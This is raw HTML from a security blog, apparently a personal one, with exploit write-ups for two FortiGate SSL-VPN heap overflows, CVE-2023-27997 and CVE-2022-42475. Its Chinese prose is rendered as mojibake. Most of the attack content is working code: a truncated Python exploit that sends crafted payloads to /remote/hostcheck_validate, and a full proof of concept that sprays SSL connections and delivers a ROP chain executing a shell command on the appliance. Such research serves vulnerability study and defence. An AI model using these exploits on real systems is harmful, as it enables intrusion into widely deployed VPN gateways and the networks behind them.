class="line">        <span class="keyword">return</span> hashlib.md5(self.salt + _seed + <span class="string">b&quot;GCC is the GNU Compiler Collection.&quot;</span>).digest()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_payload</span>(<span class="params">self, size=<span class="literal">None</span>, _seed=<span class="string">&quot;00000000&quot;</span></span>):</span><br><span class="line">        md5 = self.calc_md5(_seed.encode())</span><br><span class="line">        <span class="comment"># print(md5)</span></span><br><span class="line">        max_size = self.packet_data_size * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            size = max_size</span><br><span class="line">        <span class="keyword">elif</span> size &gt; max_size:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;create_payload: size &gt; max_size&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        len_high = (size &gt;&gt; <span class="number">8</span>) ^ md5[<span class="number">1</span>]</span><br><span class="line">        len_low = (size &amp; <span class="number">0xFF</span>) ^ md5[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        data = <span class="built_in">bytes</span>((len_low, len_high)) + <span class="string">b&quot;1&quot;</span> * self.packet_data_size</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(size))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(size &amp; <span class="number">0xFF</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(size &gt;&gt; <span class="number">8</span>))</span><br><span class="line">        payload = _seed + data.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_seed_for_md5_byte</span>(<span class="params">self, pos, value</span>):</span><br><span class="line">        distance = self.DISTANCE + pos</span><br><span class="line">        distance += <span class="number">2</span></span><br><span class="line">        MD5_LEN = <span class="number">16</span></span><br><span class="line">        rounds, offset = <span class="built_in">divmod</span>(distance, MD5_LEN)</span><br><span class="line">        <span class="built_in">print</span>(self.DISTANCE)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">divmod</span>(distance, MD5_LEN))</span><br><span class="line">        md5 = hashlib.md5</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> _seed <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">24</span>):</span><br><span class="line">            _seed = <span class="string">&quot;00&quot;</span> + p32(_seed)[:<span class="number">3</span>].<span class="built_in">hex</span>()</span><br><span class="line">            <span class="built_in">hash</span> = self.calc_md5(_seed.encode())</span><br><span class="line">            keystream = <span class="built_in">hash</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">                <span class="built_in">hash</span> = md5(<span class="built_in">hash</span>).digest()</span><br><span class="line">                keystream += <span class="built_in">hash</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hash</span>[offset] == value:</span><br><span class="line">                <span class="built_in">print</span>(_seed)</span><br><span class="line">                <span class="built_in">print</span>(keystream[self.DISTANCE + <span class="number">2</span> : self.DISTANCE + <span class="number">2</span> + pos + <span class="number">1</span>].<span class="built_in">hex</span>())</span><br><span class="line">                <span class="keyword">return</span> _seed, keystream[self.DISTANCE + <span class="number">2</span> : self.DISTANCE + <span class="number">2</span> + pos + <span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] unable to get seed&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_payload</span>(<span class="params">self, _sock, _data</span>):</span><br><span class="line">        _data = <span class="string">&quot;ajax=1&amp;username=asdf&amp;realm=&amp;enc=%s&quot;</span> % _data</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(_data) &gt; <span class="number">0x10000</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] payload too long&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        _request = <span class="string">&quot;&quot;&quot;POST /remote/hostcheck_validate HTTP/1.1\r\nHost: %s:%d\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0\r\nContent-Type: text/plain;charset=UTF-8\r\nConnection: keep-alive\r\nContent-Length: %d\r\n\r\n%s&quot;&quot;&quot;</span> % (self.ip, self.port, <span class="built_in">len</span>(_data), _data)</span><br><span class="line">        <span class="comment"># print(_request)</span></span><br><span class="line">        _sock.sendall(_request.encode())</span><br><span class="line">        _responce = _sock.recv(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">    exp = Expliot(IP, PORT)</span><br><span class="line">    salt_sock = create_ssl_socket(IP, PORT)</span><br><span class="line">    exp.get_salt(salt_sock)</span><br><span class="line">    salt_sock.close()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(exp.salt)</span><br><span class="line"></span><br><span class="line">    exp.calc_packet_data_size(<span class="number">0x1000</span>)</span><br><span class="line">    <span class="comment"># print(hex(exp.packet_data_size))</span></span><br><span class="line"></span><br><span class="line">    payload = exp.create_payload()</span><br><span class="line"></span><br><span class="line">    sock = create_ssl_socket(IP, PORT)</span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0x10</span></span><br><span class="line">    value = <span class="number">0xaa</span></span><br><span class="line">    seed, _ = exp.get_seed_for_md5_byte(offset, value)</span><br><span class="line">    payload = exp.create_payload(exp.DISTANCE+offset, seed)</span><br><span class="line">    exp.send_payload(sock, payload)</span><br><span class="line">    payload = exp.create_payload(exp.DISTANCE+offset+<span class="number">1</span>, seed)</span><br><span class="line">    exp.send_payload(sock, payload)</span><br><span class="line">    sock.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a target="_blank" rel="noopener" href="https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html">https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html</a></p>
<p><a target="_blank" rel="noopener" href="https://labs.watchtowr.com/xortigate-or-cve-2023-27997/">https://labs.watchtowr.com/xortigate-or-cve-2023-27997/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.lexfo.fr/xortigate-cve-2023-27997.html">https://blog.lexfo.fr/xortigate-cve-2023-27997.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fxc233.github.io/2023/11/06/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="fxc233">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fxc233's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/06/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow/" class="post-title-link" itemprop="url">CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-06 14:20:58" itemprop="dateCreated datePublished" datetime="2023-11-06T14:20:58+08:00">2023-11-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-12-02 23:37:17" itemprop="dateModified" datetime="2023-12-02T23:37:17+08:00">2023-12-02</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>ä¹‹å‰å°±æƒ³å¤ç°è¿™ä¸ªæ´ï¼Œä¸è¿‡å› ä¸ºç¯å¢ƒçš„é—®é¢˜è¿Ÿè¿Ÿæ²¡æœ‰å¼€å·¥ã€‚å·§åœ¨å‰ä¸€é˜µå­æœ‰ä¸ªå¸ˆå‚…æ¥æ‰¾æˆ‘è®¨è®ºåŠ«æŒ<strong>sslç»“æ„ä½“</strong>ä¸­å‡½æ•°æŒ‡é’ˆæ—¶å¦‚ä½•ç¡®å®šå †æº¢å‡ºçš„åç§»ï¼ŒåŒæ—¶è¿˜ä»–æŠŠæ­å»ºå¥½äº†çš„ç¯å¢ƒå‘ç»™äº†æˆ‘ï¼Œå› æ­¤æ‰æœ‰äº†æ­¤æ–‡ã€‚</p>
<h3 id="å¦‚ä½•åŠ«æŒSSLç»“æ„ä½“æŒ‡é’ˆå®ç°æ§åˆ¶ç¨‹åºæµ"><a href="#å¦‚ä½•åŠ«æŒSSLç»“æ„ä½“æŒ‡é’ˆå®ç°æ§åˆ¶ç¨‹åºæµ" class="headerlink" title="å¦‚ä½•åŠ«æŒSSLç»“æ„ä½“æŒ‡é’ˆå®ç°æ§åˆ¶ç¨‹åºæµ"></a>å¦‚ä½•åŠ«æŒSSLç»“æ„ä½“æŒ‡é’ˆå®ç°æ§åˆ¶ç¨‹åºæµ</h3><p>å°±æˆ‘ä¸ªäººç†è§£è€Œè¨€ï¼Œæˆ‘è§‰å¾—åŠ«æŒçš„è¿™ä¸ªå‡½æ•°æŒ‡é’ˆç±»ä¼¼äºæˆ‘ä»¬å¸¸è§çš„**__malloc_hookï¼Œ__free_hook<strong>ã€‚å®ƒæœ¬èº«çš„å€¼ä¸ºç©ºï¼Œå½“ä»–ä¸ä¸ºç©ºæ—¶ï¼Œä¾¿ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°æŒ‡é’ˆã€‚å¦‚æœæˆ‘ä»¬æŠŠè¿™ä¸ªå‡½æ•°æŒ‡é’ˆåŠ«æŒä¸ºåˆé€‚çš„</strong>gadget**ä¾¿å¯ä»¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµã€‚ç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">debug_2nd_control</span><span class="params">(__int64 a1, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">      <span class="keyword">if</span> ( v9 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v8 + <span class="number">96</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v9 != v8 + <span class="number">96</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = *(__int64 (__fastcall **)(__int64))(v9 + <span class="number">192</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v10 )</span><br><span class="line">            <span class="keyword">return</span> v10(a1);</span><br><span class="line">          ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.text:<span class="number">000000000180</span>C180 <span class="number">48</span> <span class="number">8B</span> <span class="number">82</span> C0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                    mov     rax, [rdx+<span class="number">0</span>C0h]</span><br><span class="line">.text:<span class="number">000000000180</span>C187 <span class="number">4</span>C <span class="number">89</span> EF                                mov     rdi, r13</span><br><span class="line">.text:<span class="number">000000000180</span>C18A <span class="number">48</span> <span class="number">85</span> C0                                test    rax, rax</span><br><span class="line">.text:<span class="number">000000000180</span>C18D <span class="number">0F</span> <span class="number">84</span> <span class="number">85</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                       jz      loc_180C218</span><br><span class="line">.text:<span class="number">000000000180</span>C193 <span class="number">5B</span>                                      pop     rbx</span><br><span class="line">.text:<span class="number">000000000180</span>C194 <span class="number">41</span> <span class="number">5</span>C                                   pop     r12</span><br><span class="line">.text:<span class="number">000000000180</span>C196 <span class="number">41</span> <span class="number">5</span>D                                   pop     r13</span><br><span class="line">.text:<span class="number">000000000180</span>C198 <span class="number">41</span> <span class="number">5</span>E                                   pop     r14</span><br><span class="line">.text:<span class="number">000000000180</span>C19A <span class="number">5</span>D                                      pop     rbp</span><br><span class="line">.text:<span class="number">000000000180</span>C19B FF E0                                   jmp     rax</span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h3><p>ä»ä¸‹é¢çš„æ±‡ç¼–ä¸­å¯çŸ¥ï¼Œè¿™é‡Œåˆ†é…çš„å¤§å°æ˜¯ç”±<strong>movsxd  rsi, esi</strong>ï¼Œç›´æ¥ä»4å­—èŠ‚æ‰©å±•ä¸ºäº†8å­—èŠ‚ï¼Œå¦‚æœæˆ‘ä»¬æŠŠå¤§å°æ§åˆ¶ä¸º<strong>0x1b00000000</strong>ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´åˆ†é…å¹¶åˆå§‹åŒ–çš„å¤§å°ä¸º<strong>1</strong>ï¼Œä»è€Œäº§ç”Ÿå †æº¢å‡ºã€‚åˆ©ç”¨æ‰‹æ³•æ˜¯ï¼Œåœ¨å †ä¸Šå¤§é‡å–·å°„<strong>SSL</strong>ç»“æ„ä½“ï¼Œä»è€ŒåŠ«æŒå…¶ä¸­å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">0000000001811174 8B 40 18        mov     eax, [rax+18h]  ; Keypatch modified this from:</span><br><span class="line">0000000001811174                 ;   nop word ptr [rax+rax+00000000h]</span><br><span class="line">0000000001811174                 ; Keypatch padded NOP to next boundary: 8 bytes</span><br><span class="line">0000000001811177 49 8B 3C 24     mov     rdi, [r12]      ; Keypatch modified this from:</span><br><span class="line">000000000181117B E9 86 02 00 00  jmp     loc_1811406</span><br><span class="line"></span><br><span class="line">0000000001811406 8D 70 01        lea     esi, [rax+1]    ; Keypatch modified this from:</span><br><span class="line">0000000001811409 E9 96 01 00 00  jmp     loc_18115A4</span><br><span class="line"></span><br><span class="line">00000000018115A4 48 63 F6        movsxd  rsi, esi        ; Keypatch modified this from:</span><br><span class="line">00000000018115A7 E9 88 FB FF FF  jmp     loc_1811134</span><br><span class="line"></span><br><span class="line">0000000001811134 E8 27 0A EC FF  call    alloc__</span><br></pre></td></tr></table></figure>

<h3 id="å¦‚ä½•ç¡®å®šå¡«å……æ•°é‡"><a href="#å¦‚ä½•ç¡®å®šå¡«å……æ•°é‡" class="headerlink" title="å¦‚ä½•ç¡®å®šå¡«å……æ•°é‡"></a>å¦‚ä½•ç¡®å®šå¡«å……æ•°é‡</h3><p>ç½‘ä¸Šå·²ç»æœ‰æ–‡ç«  (<a target="_blank" rel="noopener" href="https://forum.butian.net/index.php/share/2166">https://forum.butian.net/index.php/share/2166</a>) ç»™å‡ºäº†ä¸€ä¸ªå¯åŠ«æŒåˆ°å‡½æ•°æŒ‡é’ˆçš„pocã€‚æˆ‘ä»¬è¿™é‡Œå°±ç›´æ¥ç”¨äº†ä»–è¿™ç§å¸ƒå±€ï¼Œé‡ç‚¹è®°å½•ä¸€ä¸‹å¦‚ä½•æ‰¾åˆ°è¿™ä¸ªå¡«å……çš„æ•°é‡ã€‚å¯¹äºè¿™ä¸ªå›ºä»¶è€Œè¨€<strong>ssl</strong>ç»“æ„ä½“åˆå§‹åŒ–æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚ä¸‹çš„ä»£ç ã€‚å¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°ï¼Œä»–ä¼šæŠŠå­—ç¬¦ä¸²<strong>read_post_data</strong>æ‹·è´åˆ°è·ç¦»ç»“æ„ä½“åç§»ä¸º <strong>200</strong>çš„åœ°æ–¹ã€‚è€Œæ ¹æ®ä¸Šé¢çš„ä»£ç å¯çŸ¥ï¼Œæˆ‘ä»¬è¦åŠ«æŒçš„å‡½æ•°æŒ‡é’ˆåœ¨ç»“æ„ä½“åç§»ä¸º<strong>192</strong>çš„åœ°æ–¹ã€‚æ•…æˆ‘ä»¬åªéœ€å®šä½åˆ°<strong>read_post_data</strong>ï¼Œå³å¯ç¡®å®šåç§»ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">sub_181BC20(a2, <span class="string">&quot;read_post_data&quot;</span>, <span class="number">0</span>, <span class="number">1</span>, (__int64)sslvpnd_read_post_data);</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">sub_181BC20</span><span class="params">(__int64 *a1, <span class="type">const</span> <span class="type">char</span> *str, <span class="type">int</span> a3, <span class="type">int</span> a4, __int64 a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  strLen = <span class="built_in">strlen</span>(str);</span><br><span class="line">  v8 = alloc__(*a1, strLen + <span class="number">201</span>);</span><br><span class="line">  v9 = (__int64)v8;</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_QWORD *)v8 = v8;</span><br><span class="line">    *((_QWORD *)v8 + <span class="number">1</span>) = v8;</span><br><span class="line">    v10 = &amp;v8[<span class="number">32</span> * a3];</span><br><span class="line">    *((_DWORD *)v10 + <span class="number">6</span>) = a4;</span><br><span class="line">    *((_DWORD *)v10 + <span class="number">7</span>) = a4;</span><br><span class="line">    <span class="keyword">if</span> ( (a4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)(<span class="number">32LL</span> * a3 + v9 + <span class="number">32</span>) = a5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (a4 &amp; <span class="number">4</span>) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)(<span class="number">32LL</span> * a3 + v9 + <span class="number">40</span>) = a5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *)(v9 + <span class="number">200</span>), str);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è°ƒè¯•æ—¶å†…å­˜åˆ†å¸ƒå¦‚ä¸‹ï¼Œæœ‰<strong>0x2638-0x1818 &#x3D; 0xE20 &#x3D; 3616</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(gdb) i r $rdi</span><br><span class="line">rdi            0x7f6edef01818   140114163406872</span><br><span class="line">(gdb) x/10gx 0x7f6edef01818</span><br><span class="line">0x7f6edef01818: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f6edef01828: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f6edef01838: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f6edef01848: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f6edef01858: 0x0000000000000000      0x0000000000000000</span><br><span class="line">(gdb) x/10gx 0x7f6edef02638</span><br><span class="line">0x7f6edef02638: 0x0000000000000000      0x736f705f64616572</span><br><span class="line">0x7f6edef02648: 0x0000617461645f74      0x0000000000000000</span><br><span class="line">0x7f6edef02658: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f6edef02668: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f6edef02678: 0x0000000000000000      0x0000000000000000</span><br><span class="line">(gdb) x/s 0x7f6edef02640</span><br><span class="line">0x7f6edef02640: &quot;read_post_data&quot;</span><br></pre></td></tr></table></figure>



<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line">p64 = <span class="keyword">lambda</span> x: struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, x)</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;/remote/login&quot;</span>.encode()</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.229.162&quot;</span></span><br><span class="line">port = <span class="number">4443</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_ssl_ctx</span>():</span><br><span class="line">    _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    _socket.connect((ip, port))</span><br><span class="line">    _default_context = ssl._create_unverified_context()</span><br><span class="line">    _socket = _default_context.wrap_socket(_socket)</span><br><span class="line">    <span class="keyword">return</span> _socket</span><br><span class="line"></span><br><span class="line">socks = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">    sk = create_ssl_ctx()</span><br><span class="line">    data = <span class="string">b&quot;POST &quot;</span> + path + <span class="string">b&quot; HTTP/1.1\r\nHost: 192.168.229.146\r\nContent-Length: 100\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\na=1&quot;</span></span><br><span class="line">    sk.sendall(data)</span><br><span class="line">    socks.append(sk)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>, <span class="number">40</span>, <span class="number">2</span>):</span><br><span class="line">    sk = socks[i]</span><br><span class="line">    sk.close()</span><br><span class="line">    socks[i] = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">CL = <span class="string">&quot;115964116992&quot;</span></span><br><span class="line">data = <span class="string">b&quot;POST &quot;</span> + path + <span class="string">b&quot; HTTP/1.1\r\nHost: 192.168.229.146\r\nContent-Length: &quot;</span> + CL.encode() + <span class="string">b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\nf=1&quot;</span></span><br><span class="line"></span><br><span class="line">exp_sk = create_ssl_ctx()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    sk = create_ssl_ctx()</span><br><span class="line">    socks.append(sk)</span><br><span class="line"></span><br><span class="line">exp_sk.sendall(data)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;b&quot;</span> * (<span class="number">3613</span>-<span class="number">0xc0</span>)</span><br><span class="line">payload+= p64(<span class="number">0</span>)</span><br><span class="line">payload+= p64(<span class="number">0x19de70a</span>)</span><br><span class="line"><span class="comment"># 0x00000000019de70a : pop r12 ; pop r13 ; pop rbp ; ret</span></span><br><span class="line">payload+= p64(<span class="number">0x100</span>)*<span class="number">3</span></span><br><span class="line">payload+= p64(<span class="number">0x1855c29</span>)</span><br><span class="line"><span class="comment"># 0x0000000001855c29 : add rdx, r8 ; mov byte ptr [rdx], 0 ; ret</span></span><br><span class="line">payload+= p64(<span class="number">0x1fe54ad</span>)</span><br><span class="line"><span class="comment"># 0x0000000001fe54ad : pop rbp ; mov rax, rdx ; ret</span></span><br><span class="line">payload+= p64(<span class="number">0x30</span>)</span><br><span class="line">payload+= p64(<span class="number">0x18cfb70</span>)</span><br><span class="line"><span class="comment"># 0x00000000018cfb70 : lea rdi, [rax - 0x28] ; call qword ptr [rax + 0x30]</span></span><br><span class="line">payload+= p64(<span class="number">0x40</span>)*(<span class="number">24</span>-<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">payload+= p64(<span class="number">0x1d3379c</span>) <span class="comment"># rip</span></span><br><span class="line"><span class="comment"># push rdx ; adc byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret</span></span><br><span class="line">payload+= p64(<span class="number">0x736f705f64616572</span>)</span><br><span class="line">payload+= p64(<span class="number">0x0000617461645f74</span>)</span><br><span class="line">cmd = <span class="string">b&quot;busybox ls &gt; /tmp/hack&quot;</span></span><br><span class="line">cmd = cmd.ljust(<span class="number">11</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+= cmd</span><br><span class="line">payload+= p64(<span class="number">0x43FDF0</span>)</span><br><span class="line"></span><br><span class="line">exp_sk.sendall(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sk <span class="keyword">in</span> socks:</span><br><span class="line">    <span class="keyword">if</span> sk:</span><br><span class="line">        data = <span class="string">b&quot;b&quot;</span> * <span class="number">40</span></span><br><span class="line">        sk.sendall(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;done&quot;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a target="_blank" rel="noopener" href="https://forum.butian.net/index.php/share/2166">https://forum.butian.net/index.php/share/2166</a></p>
<p><a target="_blank" rel="noopener" href="https://bestwing.me/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html">https://bestwing.me/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html</a></p>
<p><a target="_blank" rel="noopener" href="https://wzt.ac.cn/2022/12/15/CVE-2022-42475/">https://wzt.ac.cn/2022/12/15/CVE-2022-42475/</a></p>
<p><a target="_blank" rel="noopener" href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/">https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
